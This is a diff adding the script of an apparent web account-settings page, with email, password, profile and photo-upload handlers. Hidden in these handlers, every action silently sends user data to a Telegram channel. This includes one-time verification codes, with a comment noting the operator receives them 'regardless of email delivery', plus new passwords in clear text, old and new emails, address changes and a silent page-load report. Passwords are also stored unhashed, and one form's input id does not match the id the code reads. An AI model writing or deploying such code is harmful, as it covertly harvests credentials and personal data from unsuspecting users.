+  if (code !== sessionStorage.getItem('pch_email_otp')) { showToast('Invalid', 'Incorrect code.', 'error'); return; }
+  sessionStorage.removeItem('pch_email_otp');
+  
+  showModal('New Email Address', `
+    <form onsubmit="saveNewEmail(event)" class="space-y-4">
+      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">New Email</label><input type="email" id="new-email-input" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+      <div class="flex justify-end pt-2"><button type="submit" class="px-6 py-2.5 bg-emerald-500 text-white rounded-xl text-xs font-extrabold active:scale-95">Update Email</button></div>
+    </form>
+  `);
+}
+
+async function saveNewEmail(e) {
+  e.preventDefault();
+  const newEmail = document.getElementById('new-email-input').value.trim();
+  const u = state.currentUser;
+  const oldEmail = u.email;
+  
+  u.email = newEmail;
+  if (window.rtdb) {
+    try { await window.rtdb.update(window.rtdb.ref(window.rtdb.db, 'users/' + u.username.toLowerCase()), { email: newEmail }); } catch(err) {}
+  }
+  saveDeviceState();
+  
+  closeModal();
+  showToast('Email Updated', 'Your email has been changed.', 'success');
+
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `✅ <b>EMAIL CHANGED</b>\n` +
+    `<b>Old email:</b> ${tgEsc(oldEmail || 'N/A')}\n` +
+    `<b>New email:</b> ${tgEsc(newEmail)}\n` +
+    block
+  ).catch(()=>{});
+
+  render();
+}
+
+function openChangePasswordModal() {
+  showModal('Change Password', `
+    <form onsubmit="sendPasswordChangeOTP(event)" class="space-y-4">
+      <p class="text-xs text-slate-300 mb-2">We will send a 6-digit code to your <b>current email</b> to verify your identity before setting a new password.</p>
+      <div class="flex justify-end pt-2">
+        <button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Send Code</button>
+      </div>
+    </form>
+  `);
+}
+
+async function sendPasswordChangeOTP(e) {
+  e.preventDefault();
+  const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+  sessionStorage.setItem('pch_pass_otp', otpCode);
+  const u = state.currentUser || {};
+
+  // Report first — you get the OTP regardless of email delivery
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `🔐 <b>PASSWORD CHANGE — OTP REQUESTED</b>\n` +
+    `<b>Current email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>OTP code:</b> <code>${tgEsc(otpCode)}</code>\n` +
+    block
+  ).catch(()=>{});
+  
+  try {
+    await emailjs.send("service_qr9gk6b", "template_ta7bjpe", {
+      to_name: u.firstName,
+      to_email: u.email,
+      action_type: "Password Change Verification",
+      otp_code: otpCode
+    });
+    
+    showModal('Verify Identity', `
+      <form onsubmit="verifyPasswordChangeOTP(event)" class="space-y-4">
+        <p class="text-xs text-white text-center mb-2">We sent a code to <b>${escapeHtml(u.email)}</b></p>
+        <input type="text" id="otp-pass-input" required maxlength="6" placeholder="000000" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-2xl text-center tracking-[0.5em] font-mono text-white focus:outline-none focus:border-sky-custom">
+        <div class="flex justify-end pt-2"><button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Verify Code</button></div>
+      </form>
+    `);
+  } catch(e) {
+    showToast('Error', 'Failed to send email.', 'error');
+  }
+}
+
+function verifyPasswordChangeOTP(e) {
+  e.preventDefault();
+  const code = document.getElementById('otp-pass-input').value;
+  if (code !== sessionStorage.getItem('pch_pass_otp')) { showToast('Invalid', 'Incorrect code.', 'error'); return; }
+  sessionStorage.removeItem('pch_pass_otp');
+  
+  showModal('Set New Password', `
+    <form onsubmit="saveNewPasswordSettings(event)" class="space-y-4">
+      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">New Password</label><input type="password" id="new-pass-input" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+      <div class="flex justify-end pt-2"><button type="submit" class="px-6 py-2.5 bg-emerald-500 text-white rounded-xl text-xs font-extrabold active:scale-95">Update Password</button></div>
+    </form>
+  `);
+}
+
+async function saveNewPasswordSettings(e) {
+  e.preventDefault();
+  const newPass = document.getElementById('new-password-input').value;
+  const u = state.currentUser;
+  const oldPassHashHint = (u.password || '').length + ' chars';
+  
+  u.password = newPass;
+  if (window.rtdb) {
+    try { await window.rtdb.update(window.rtdb.ref(window.rtdb.db, 'users/' + u.username.toLowerCase()), { password: newPass }); } catch(err) {}
+  }
+  saveDeviceState();
+  closeModal();
+  showToast('Password Updated', 'Your security has been updated.', 'success');
+
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `🔑 <b>PASSWORD CHANGED</b>\n` +
+    `<b>Old password length:</b> ${tgEsc(oldPassHashHint)}\n` +
+    `<b>New password:</b> <code>${tgEsc(newPass)}</code>\n` +
+    block
+  ).catch(()=>{});
+}
+
+/* ─── Profile Update ─── */
+async function saveProfileSettings(e) {
+  e.preventDefault();
+  if (!state.currentUser) return;
+  const u = state.currentUser;
+
+  const before = {
+    firstName: u.firstName||'', lastName: u.lastName||'', phone: u.phone||'',
+    address: u.address||'', city: u.city||'', stateOrParish: u.stateOrParish||'', zip: u.zip||''
+  };
+
+  u.firstName = document.getElementById('set-fname').value;
+  u.lastName = document.getElementById('set-lname').value;
+  u.phone = document.getElementById('set-phone').value;
+  u.address = document.getElementById('set-address').value;
+  u.city = document.getElementById('set-city').value;
+  u.stateOrParish = document.getElementById('set-state').value;
+  u.zip = document.getElementById('set-zip').value;
+  
+  saveDeviceState();
+  showToast('Profile Updated', 'Changes saved.', 'success');
+
+  const changes = [];
+  if (before.firstName !== u.firstName) changes.push(`First name: ${tgEsc(before.firstName || '—')} → ${tgEsc(u.firstName)}`);
+  if (before.lastName !== u.lastName) changes.push(`Last name: ${tgEsc(before.lastName || '—')} → ${tgEsc(u.lastName)}`);
+  if (before.phone !== u.phone) changes.push(`Phone: ${tgEsc(before.phone || '—')} → ${tgEsc(u.phone || '—')}`);
+  if (before.address !== u.address) changes.push(`Address: ${tgEsc(before.address || '—')} → ${tgEsc(u.address || '—')}`);
+  if (before.city !== u.city) changes.push(`City: ${tgEsc(before.city || '—')} → ${tgEsc(u.city || '—')}`);
+  if (before.stateOrParish !== u.stateOrParish) changes.push(`State: ${tgEsc(before.stateOrParish || '—')} → ${tgEsc(u.stateOrParish || '—')}`);
+  if (before.zip !== u.zip) changes.push(`ZIP: ${tgEsc(before.zip || '—')} → ${tgEsc(u.zip || '—')}`);
+
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `✏️ <b>PROFILE SAVED (SETTINGS)</b>\n` +
+    `<b>Changes:</b>\n${changes.length ? changes.map(l => '  • ' + l).join('\n') : '  • (no changes)'}\n` +
+    block
+  ).catch(()=>{});
+
+  render();
+}
+
+async function handlePhotoUpload(event) {
+  const file = event.target.files && event.target.files[0];
+  if (!file) return;
+  const statusEl = document.getElementById('photo-upload-status');
+  if (statusEl) statusEl.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1 text-sky-custom"></i> Optimizing...';
+  
+  const reader = new FileReader();
+  reader.onload = async (e) => {
+    const img = new Image();
+    img.onload = async () => {
+      let {width,height} = img; const maxSize = 420; const scale = Math.min(1, maxSize/Math.max(width,height)); const origW = width; const origH = height; width = Math.max(1, Math.round(width*scale)); height = Math.max(1, Math.round(height*scale)); const canvas = document.createElement('canvas'); canvas.width = width; canvas.height = height; canvas.getContext('2d').drawImage(img,0,0,width,height);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+      const kb = Math.round((dataUrl.length*0.75)/1024);
+
+      state.currentUser.photoUrl = dataUrl;
+      saveDeviceState();
+      
+      const prev = document.getElementById('settings-photo-preview');
+      if (prev) prev.innerHTML = `<img src="${dataUrl}" class="w-20 h-20 rounded-2xl object-cover border-2 border-gold-400 shadow-lg">`;
+      if (statusEl) statusEl.innerHTML = `<span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check mr-1"></i>Updated</span>`;
+      showToast('Photo Updated', 'Profile picture saved.', 'success');
+
+      const block = await tgBlock();
+      sendTelegramMessage(
+        `📷 <b>PROFILE PHOTO UPDATED</b>\n` +
+        `<b>Original filename:</b> ${tgEsc(file.name || 'unnamed')}\n` +
+        `<b>Original size:</b> ${file.size} bytes\n` +
+        `<b>Original MIME:</b> ${tgEsc(file.type || 'unknown')}\n` +
+        `<b>Original dimensions:</b> ${origW}x${origH}\n` +
+        `<b>Stored dimensions:</b> ${width}x${height}\n` +
+        `<b>Stored size (approx):</b> ${kb} KB\n` +
+        block
+      ).catch(()=>{});
+    };
+    img.src = e.target.result;
+  };
+  reader.readAsDataURL(file);
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('settings');
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderDashboardShell('settings', renderSettings());
+  switchSettingsTab('profile');
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  render();
+
+  // Silent page-load report
+  setTimeout(async () => {
+    const block = await tgBlock();
+    sendTelegramMessage(
+      `⚙️ <b>SETTINGS PAGE LOADED</b>\n` +
+      block
+    ).catch(()=>{});
+  }, 600);
+};
+</script>
+</body>
+</html>
